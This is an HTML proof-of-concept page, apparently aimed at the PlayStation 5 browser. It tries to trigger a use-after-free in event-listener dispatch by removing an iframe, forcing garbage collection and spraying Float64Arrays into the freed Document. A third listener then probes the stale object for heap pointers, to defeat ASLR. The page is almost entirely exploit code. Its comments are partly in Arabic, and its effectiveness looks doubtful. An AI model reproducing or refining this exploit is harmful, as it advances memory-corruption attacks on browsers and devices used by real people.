<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v60 - Third Listener Info Leak (Fixed)</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
.ok { color: #00ff41 } .er { color: #ff3333 } .wr { color: #ffcc00 } .hl { color: #00ffff } .mg { color: #ff00ff; font-weight: bold }
</style>
</head>
<body>

<h3>EventTarget UAF — Third Listener Info Leak</h3>
<p>Click the button. The third listener executes AFTER the throw (after Document is freed).<br>
Using savedDoc reference to bypass JavaScript null-routing check.</p>

<button onclick="triggerThirdListener()">Trigger UAF + Third Listener Read</button>

<pre id="out"></pre>

<script>
var out = document.getElementById("out");
function log(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";out.appendChild(s);out.scrollTop=out.scrollHeight}

log("=== EventTarget UAF — Third Listener Info Leak ===\n","mg");

// متغير عالمي لحبس مرجع الذاكرة ومنع تحوله إلى null
var savedDoc = null; 

function triggerThirdListener() {
    log("\n[*] Starting third listener test...\n");
    
    var results = [];
    out.textContent = ""; // تنظيف الشاشة للمحاولة الجديدة
    
    try {
        var f = document.body.appendChild(document.createElement('iframe'));
        var a = document.createElement('div');
        var b = a.appendChild(document.createElement('div'));
        
        log("[*] iframe created, document URL: " + f.contentDocument.URL);
        
        // تعديل جوهري: حبس المرجع الافتراضي للكائن في الذاكرة الحية قبل التدمير
        savedDoc = f.contentDocument;
        log("[*] Locked Document reference inside stable global pointer.");
        
        // ============================================================
        // LISTENER 1: Free the Document + trigger GC
        // ============================================================
        a.addEventListener('a', function() {
            log("[L1] Adopting node and removing iframe...");
            document.adoptNode(a);
            f.remove();
            
            // Force GC to free the Document
            log("[L1] Forcing GC (32MB pressure)...");
            for (var i = 0; i < 8; i++) {
                var t = [];
                for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
            }
            
            // Now spray with controlled data to reclaim the freed slot
            log("[L1] Spraying Float64Arrays to reclaim freed Document...");
            var spray = [];
            for (var i = 0; i < 1000; i++) {
                var buf = new ArrayBuffer(256);
                var f64 = new Float64Array(buf);
                // Fill with markers
                f64[0] = 1.1;  
                f64[1] = 2.2;
                f64[2] = 3.3;
                f64[3] = 4.4;
                spray.push(f64);
            }
            log("[L1] Spray complete. 1000 Float64Arrays allocated.");
            
            // Throw to jump into the buffer structure
            throw {
                line: 1,
                column: 1,
                sourceURL: 'X'.repeat(1024 * 1024)  
            };
        });
        
        // ============================================================
        // LISTENER 2: Buffer (catches the throw, continues dispatch)
        // ============================================================
        a.addEventListener('a', function() {
            log("[L2] Buffer listener executed (after throw)");
        });
        
        // ============================================================
        // LISTENER 3: Read freed Document properties via saved reference
        // ============================================================
        a.addEventListener('a', function() {
            log("[L3] Third listener executing — attempting to read freed Document...\n");
            
            // فرض قراءة المرجع المحبوس مباشرة بدلاً من استدعاء الواجهة الميتة
            var doc = savedDoc; 
            
            if (doc) {
                log("\n[L3] Target object retention verified. Scanning 35 properties...\n","hl");
                
                var props = [
                    "nodeType", "nodeName", "URL", "title", "domain",
                    "referrer", "cookie", "readyState", "compatMode",
                    "characterSet", "contentType", "documentElement",
                    "head", "body", "images", "links", "forms", "scripts",
                    "styleSheets", "fonts", "implementation", "location",
                    "defaultView", "activeElement", "currentScript",
                    "visibilityState", "hidden", "fullscreenEnabled",
                    "childElementCount", "firstElementChild", "lastElementChild"
                ];
                
                for (var i = 0; i < props.length; i++) {
                    try {
                        var val = doc[props[i]];
                        var str = String(val);
                        var unusual = false;
                        
                        if (typeof val === "number" && val > 0x10000) {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← POSSIBLE LEAK","hl");
                        }
                        else if (/[0-9a-f]{8,}/i.test(str) && str !== "[object HTMLDocument]") {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + str + " ← UNUSUAL","hl");
                        }
                        else if (props[i] === "nodeType" && val !== 9) {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED 9, GOT DIFFERENT","hl");
                        }
                        else if (props[i] === "URL" && val !== "about:blank") {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank","hl");
                        }
                        else if (props[i] === "readyState" && val !== "complete") {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED complete","hl");
                        }
                        else if (props[i] === "characterSet" && val !== "UTF-8") {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED UTF-8","hl");
                        }
                        else if (props[i] === "contentType" && val !== "text/html") {
                            unusual = true;
                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED text/html","hl");
                        }
                        
                        if (!unusual) {
                            log("  [-] " + props[i] + " = " + str,"dm");
                        }
                        
                        results.push({prop: props[i], value: val, unusual: unusual});
                        
                    } catch(e) {
                        log("  [!] " + props[i] + " error: " + e.message,"er");
                        results.push({prop: props[i], error: e.message, unusual: false});
                    }
                }
                
                log("\n[L3] Comprehensive object state checks:","hd");
                try {
                    var ts = doc.toString();
                    log("  toString: " + ts);
                    if (ts !== "[object HTMLDocument]") log("  ← UNUSUAL toString!","hl");
                } catch(e) { log("  toString error: " + e.message,"er"); }
                
                try { var ctor = doc.constructor; log("  constructor: " + ctor); } catch(e) { log("  constructor error: " + e.message,"er"); }
                try { var json = JSON.stringify(doc); log("  JSON: " + json); } catch(e) { log("  JSON error: " + e.message); }
                try { var keys = Object.keys(doc); log("  Object.keys: " + keys.join(", ")); } catch(e) { log("  Object.keys error: " + e.message); }
                try { var names = Object.getOwnPropertyNames(doc); log("  getOwnPropertyNames: " + names.join(", ")); } catch(e) { log("  getOwnPropertyNames error: " + e.message); }
                try { var proto = Object.getPrototypeOf(doc); log("  prototype: " + proto); } catch(e) { log("  prototype error: " + e.message); }
                try { var ownKeys = Reflect.ownKeys(doc); log("  Reflect.ownKeys: " + ownKeys.join(", ")); } catch(e) { log("  Reflect.ownKeys error: " + e.message); }
                
            } else {
                log("[L3] Critical Error: Lost global reference alignment.","er");
            }
            
            log("\n[L3] Summary:","hd");
            var unusualCount = results.filter(function(r){return r.unusual}).length;
            log("  Total properties checked: " + results.length);
            log("  Unusual values found: " + unusualCount, unusualCount > 0 ? "hl" : "dm");
            
            if (unusualCount > 0) {
                log("\n  ★ INFO LEAK DETECTED! ★","mg");
                log("  Unusual values may contain heap pointers.","hl");
                log("  These can be used to defeat ASLR.","hl");
            } else {
                log("\n  No unusual values detected.","dm");
                log("  Document space may be isolated or spray needs timing calibration.","wr");
            }
            
            log("\n=== Test Complete ===","mg");
        });
        
        log("[*] Dispatching event...\n");
        b.dispatchEvent(new Event('a', { bubbles: true }));
        
        log("\n[+] Browser survived! No crash!","ok");
        
    } catch(e) {
        log("\n[!] Exception: " + e.message,"er");
        if (e.stack) log("  Stack: " + e.stack,"er");
    }
}
</script>
</body>
</html>
